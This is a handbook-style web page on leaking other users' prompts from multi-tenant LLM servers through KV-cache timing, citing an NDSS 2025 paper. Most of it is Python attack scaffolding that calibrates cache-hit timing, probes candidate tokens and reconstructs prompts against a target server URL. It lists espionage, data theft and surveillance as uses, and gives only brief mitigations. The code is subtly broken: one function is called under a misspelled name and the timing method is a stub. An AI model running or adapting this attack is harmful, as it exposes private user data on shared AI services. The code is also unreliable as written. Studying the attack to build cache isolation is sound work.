<meta name="title" content="AI Security Handbook">
<meta name="description" content="Develop Secure AI Systems">
<meta property="og:title" content="AI Security Handbook">
<meta property="og:description" content="Develop Secure AI Systems">
<meta property="og:type" content="article">
<meta property="og:url" content="https://aisecurityhandbook.com/">
<meta property="og:image" content="https://aisecurityhandbook.com/img/social.png">
<meta name="twitter:title" content="AI Security Handbook">
<meta name="twitter:description" content="Develop Secure AI Systems">
<meta name="twitter:url" content="https://aisecurityhandbook.com/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://aisecurityhandbook.com/img/social.png">

# Prompt Leakage via KV Cache Sharing in Multi-tenant LLM Servers



Multi-tenant LLM servers share KV-cache between users for efficiency. This creates a massive side-channel vulnerability. You can monitor cache behavior to reconstruct other users' prompts in real-time.


**Target Frameworks:** vLLM, SGLang, LightLLM, DeepSpeed

## Attack Flow

![KV-Cache Attack Sequence](./prompt-leakage-kv-cache-sharing.png)

## How KV-Cache Sharing Works

Think of KV-cache like a shared notepad that the LLM uses to remember what it just processed.

**The Basic Idea:**
1. LLM processes tokens and creates "memory" (KV-cache) for each one
2. When multiple users have similar prompts, the server reuses this memory
3. Cache hits = fast response, cache misses = slow response
4. By timing responses, you can figure out what's cached (and what other users asked)

**Why Servers Do This:**
- Each token needs ~1MB of KV-cache memory
- GPU memory is expensive and limited
- Sharing cache across users saves massive amounts of memory and computation

```python
def simple_kv_cache_example():
    """Dead simple example of how KV-cache sharing works"""
    
    # Imagine these are two user requests
    user1_prompt = "Help me translate this sentence into English"
    user2_prompt = "Help me translate this sentence into French"
    
    # Server processes user1 first
    user1_tokens = user1_prompt.split()
    kv_cache = {}
    
    print("Processing User 1:")
    for i, token in enumerate(user1_tokens):
        # Simulate creating KV cache for each token
        cache_key = " ".join(user1_tokens[:i+1])
        kv_cache[cache_key] = f"kv_data_for_{token}"
        print(f"  Cached: '{cache_key}'")
    
    print(f"\nKV Cache now contains {len(kv_cache)} entries")
    
    # User2 request comes in
    user2_tokens = user2_prompt.split()
    cache_hits = 0
    cache_misses = 0
    
    print("\nProcessing User 2:")
    for i, token in enumerate(user2_tokens):
        cache_key = " ".join(user2_tokens[:i+1])
        
        if cache_key in kv_cache:
            print(f"CACHE HIT: '{cache_key}' (fast response)")
            cache_hits += 1
        else:
            print(f"CACHE MISS: '{cache_key}' (slow response)")
            kv_cache[cache_key] = f"kv_data_for_{token}"
            cache_misses += 1
    
    print(f"\nResults: {cache_hits} hits, {cache_misses} misses")
    print("An attacker can infer User 1's prompt by observing these patterns!")

# Run the example
simple_kv_cache_example()

# Output shows:
# - First 6 tokens are cache hits (shared between prompts)
# - Last 2 tokens are cache misses (different between prompts)
# - Timing differences reveal the shared prefix!
```

**Key Insight:** Cache behavior creates a timing side-channel that leaks information about what other users have asked.

### How Servers Optimize Cache Sharing

**Longest Prefix Match (LPM):**
- Server prioritizes requests that share the longest prefix with cached data
- Example: If "Imagine you are an expert" is cached, requests starting with this get priority
- This optimization makes the side-channel even more exploitable

```python
def lpm_scheduling_example():
    """How LPM scheduling works and why it's exploitable"""
    
    # Current cache contains this prompt
    cached_prompt = "Imagine you are an expert programmer. Write a function to"
    cached_tokens = cached_prompt.split()
    
    # Three new requests come in
    requests = [
        "Imagine you are an expert programmer. Debug this code",  # 6 token match
        "Imagine you are an expert chef. Make a recipe",          # 5 token match  
        "Write a simple hello world program",                     # 0 token match
    ]
    
    print("LPM Scheduling Priority:")
    for i, request in enumerate(requests):
        request_tokens = request.split()
        
        # Find longest matching prefix
        match_length = 0
        for j in range(min(len(cached_tokens), len(request_tokens))):
            if cached_tokens[j] == request_tokens[j]:
                match_length += 1
            else:
                break
        
        print(f"Request {i+1}: {match_length} token match - Priority {3-i}")
        print(f"  '{request}'")
    
    print("By sending requests with different prefixes and measuring response times,")
    print("you can determine what's currently cached (i.e., what others asked)!")

lmp_scheduling_example()
```

## The Attack


### Step 1: Set Up Monitoring

**What we're doing**: Learning how to detect cache hits vs misses.

**Why**: We need to distinguish between fast (cached) and slow (uncached) responses.


```python
import time
import requests
import statistics

class CacheMonitor:
    def __init__(self, server_url):
        self.server_url = server_url
        self.baseline_times = []
        self.cache_hit_threshold = None
    
    def calibrate(self):
        """Learn what cache hits vs misses look like"""
        
        # Send requests we know will be cache misses (random strings)
        miss_times = []
        for i in range(10):
            random_prompt = f"Random uncached prompt {i} xyz123"
            response_time = self.measure_response_time(random_prompt)
            miss_times.append(response_time)
            time.sleep(0.1)  # Don't overwhelm server
        
        # Send the same request multiple times (should be cache hits after first)
        hit_times = []
        repeated_prompt = "This prompt will be cached after first request"
        for i in range(10):
            response_time = self.measure_response_time(repeated_prompt)
            if i > 0:  # Skip first request (that's the miss)
                hit_times.append(response_time)
            time.sleep(0.1)
        
        # Calculate threshold
        avg_miss_time = statistics.mean(miss_times)
        avg_hit_time = statistics.mean(hit_times)
        self.cache_hit_threshold = (avg_miss_time + avg_hit_time) / 2
        
        print(f"  Cache miss avg: {avg_miss_time:.3f}s")
        print(f"  Cache hit avg: {avg_hit_time:.3f}s") 
        print(f"  Threshold: {self.cache_hit_threshold:.3f}s")
        
        return avg_miss_time > avg_hit_time  # Sanity check
    
    def measure_response_time(self, prompt):
        """Measure how long server takes to respond"""
        ...
    
    def is_cache_hit(self, prompt):
        """Determine if a prompt results in cache hit"""
        response_time = self.measure_response_time(prompt)
        return response_time < self.cache_hit_threshold
    
    def probe_token_sequence(self, token_sequence):
        """Test if a specific token sequence is cached"""
        prompt = " ".join(token_sequence)
        is_hit = self.is_cache_hit(prompt)
        
        print(f"Probe: '{prompt[:50]}...' -> {'HIT' if is_hit else 'MISS'}")
        return is_hit


monitor = CacheMonitor("http://llm-server:8000")
if monitor.calibrate():
    print("✅ Calibration successful - ready to attack!")
else:
    print("❌ Calibration failed - server might not be vulnerable")
```

### Step 2: Probe with Candidate Tokens

**What we're doing**: Testing different token combinations to see what's cached.

**Why**: Cached tokens reveal what other users have asked.

**Simple analogy**: Like playing 20 questions, but the speed of the answer tells you if you're on the right track.

```python
class TokenProber:
    def __init__(self, monitor):
        self.monitor = monitor
        self.common_tokens = [
            # Common prompt starters
            "Imagine", "you", "are", "an", "expert", "in",
            "Help", "me", "with", "this", "problem",
            "Write", "a", "function", "that", "can",
            "Translate", "the", "following", "text", "into",
            "Explain", "how", "to", "solve", "this",
            # Common words
            "the", "and", "or", "but", "for", "to", "of", "in", "on", "at",
            # Technical terms
            "code", "program", "algorithm", "data", "system", "network",
            "security", "password", "login", "database", "server"
        ]
    
    def find_cached_prefix(self, max_length=10):
        """Find the longest cached token sequence"""
        
        cached_sequence = []
        
        for position in range(max_length):
            print(f"\nTesting position {position + 1}:")
            found_token = None
            
            # Try each common token at this position
            for token in self.common_tokens:
                test_sequence = cached_sequence + [token]
                
                if self.monitor.probe_token_sequence(test_sequence):
                    print(f"Found token: '{token}'")
                    found_token = token
                    break
                else:
                    print(f"Not cached: '{token}'")
            
            if found_token:
                cached_sequence.append(found_token)
                print(f"Current sequence: {' '.join(cached_sequence)}")
            else:
                print(f"No more tokens found at position {position + 1}")
                break
        
        return cached_sequence
    
    def refine_sequence(self, base_sequence):
        """Try to find more specific tokens after the base sequence"""
        print(f"\nRefining sequence: '{' '.join(base_sequence)}'")
        
        # Try common continuations
        continuations = [
            ["programmer", "developer", "engineer", "coder"],
            ["write", "create", "build", "develop", "make"],
            ["function", "method", "class", "script", "program"],
            ["that", "which", "to", "for", "with"],
            ["can", "will", "should", "must", "could"]
        ]
        
        refined_sequence = base_sequence.copy()
        
        for continuation_set in continuations:
            found_continuation = None
            
            for token in continuation_set:
                test_sequence = refined_sequence + [token]
                
                if self.monitor.probe_token_sequence(test_sequence):
                    print(f"Found continuation: '{token}'")
                    found_continuation = token
                    break
            
            if found_continuation:
                refined_sequence.append(found_continuation)
            else:
                break
        
        return refined_sequence

prober = TokenProber(monitor)
cached_prefix = prober.find_cached_prefix()
if cached_prefix:
    refined_sequence = prober.refine_sequence(cached_prefix)
    print(f"\nReconstructed prompt prefix: '{' '.join(refined_sequence)}'")
```

### Step 3: Reconstruct Full Prompts

**What we're doing**: Piecing together the complete prompt from the cached tokens.

**Why**: This gives us the full sensitive information other users submitted.


```python
class PromptReconstructor:
    def __init__(self, monitor):
        self.monitor = monitor
        self.vocabulary = self.load_vocabulary()
    
    def load_vocabulary(self):
        """Load common words and phrases for reconstruction"""
        return {
            'starters': [
                "Imagine you are", "Help me", "Write a", "Create a", 
                "Explain how", "Show me", "Tell me", "Generate"
            ],
            'roles': [
                "expert programmer", "security analyst", "data scientist",
                "system administrator", "network engineer", "AI researcher"
            ],
            'actions': [
                "write code", "debug this", "analyze data", "solve problem",
                "create script", "build system", "design algorithm"
            ],
            'objects': [
                "function", "class", "script", "program", "algorithm",
                "database", "network", "system", "application"
            ],
            'connectors': ["that", "which", "to", "for", "with", "in", "on", "at"],
            'endings': ["please", "thanks", "help", "urgent", "asap"]
        }
    
    def reconstruct_template(self, known_prefix):
        """Reconstruct prompt template from known prefix"""
        print(f"🔨 Reconstructing template from: '{' '.join(known_prefix)}'")
        
        template_parts = [known_prefix]
        current_sequence = known_prefix.copy()
        
        # Try to extend with common patterns
        for category, words in self.vocabulary.items():
            if category == 'starters':
                continue  # Already have the start
                
            print(f"\nTrying {category}:")
            found_extension = []
            
            for phrase in words:
                phrase_tokens = phrase.split()
                test_sequence = current_sequence + phrase_tokens
                
                if self.monitor.probe_token_sequence(test_sequence):
                    print(f"Found {category}: '{phrase}'")
                    found_extension = phrase_tokens
                    break
                else:
                    print(f"Not found: '{phrase}'")
            
            if found_extension:
                current_sequence.extend(found_extension)
                template_parts.append(found_extension)
        
        return current_sequence
    
    def extract_variables(self, template):
        """Try to extract variable parts of the prompt"""
        print(f"\nLooking for variable content in template...")
        
        # Common variable patterns
        variable_patterns = [
            ["this", "code"], ["this", "problem"], ["this", "data"],
            ["following", "text"], ["below", "information"],
            ["my", "project"], ["our", "system"], ["the", "issue"]
        ]
        
        variables_found = []
        
        for pattern in variable_patterns:
            test_sequence = template + pattern
            
            if self.monitor.probe_token_sequence(test_sequence):
                print(f"Found variable pattern: '{' '.join(pattern)}'")
                variables_found.append(pattern)
        
        return variables_found
    
    def full_reconstruction(self, max_attempts=50):
        """Complete prompt reconstruction process"""
        print("Starting full prompt reconstruction...")
        
        # Step 1: Find initial cached prefix
        initial_probe = TokenProber(self.monitor)
        base_prefix = initial_probe.find_cached_prefix()
        
        if not base_prefix:
            print("No cached tokens found")
            return None
        
        # Step 2: Reconstruct template
        full_template = self.reconstruct_template(base_prefix)
        
        # Step 3: Extract variables
        variables = self.extract_variables(full_template)
        
        # Step 4: Attempt to reconstruct full prompt
        reconstructed_prompt = " ".join(full_template)
        
        if variables:
            reconstructed_prompt += " [VARIABLE_CONTENT]"
        
        print(f"\nRECONSTRUCTION COMPLETE:")
        print(f"Template: '{' '.join(full_template)}'")
        print(f"Variables: {variables}")
        print(f"Full prompt: '{reconstructed_prompt}'")
        
        return {
            'template': full_template,
            'variables': variables,
            'full_prompt': reconstructed_prompt
        }

# Complete attack example
def run_complete_attack(server_url):
    """Run the complete KV-cache side-channel attack"""
    print("Starting KV-Cache Side-Channel Attack")
    
    # Step 1: Set up monitoring
    monitor = CacheMonitor(server_url)
    if not monitor.calibrate():
        print("Attack failed - server not vulnerable")
        return None
    
    # Step 2: Reconstruct prompts
    reconstructor = PromptReconstructor(monitor)
    result = reconstructor.full_reconstruction()
    
    if result:
        print("\nAttack successful!")
        return result
    else:
        print("\nAttack failed - no prompts reconstructed")
        return None

# Usage
# result = run_complete_attack("http://target-llm-server:8000")
```

**The Big Picture:**
1. **Monitor** = Learn to detect cache hits vs misses through timing
2. **Probe** = Test token combinations to find what's cached
3. **Reconstruct** = Piece together the full prompts from cached fragments


## Attack Scenarios

### Template Extraction

**Target**: Extract the structure of prompts other users are sending.

**Use Case**: Corporate espionage, competitive intelligence, understanding AI usage patterns.

### Input Extraction

**Target**: Extract specific sensitive data from other users' prompts.

**Use Case**: Stealing proprietary information, personal data, confidential documents.

### Blind Reconstruction

**Target**: Reconstruct prompts with no prior knowledge.

**Use Case**: General surveillance, discovering unknown attack vectors.


## Mitigation

* Implement user-specific cache isolation.
* Add random delays to mask cache timing.
* Implement rate limiting to prevent rapid probing.


## References

[1] Wu, G., et al. (2025). I Know What You Asked: Prompt Leakage via KV-Cache Sharing in Multi-Tenant LLM Serving. NDSS 2025. https://www.ndss-symposium.org/wp-content/uploads/2025-1772-paper.pdf

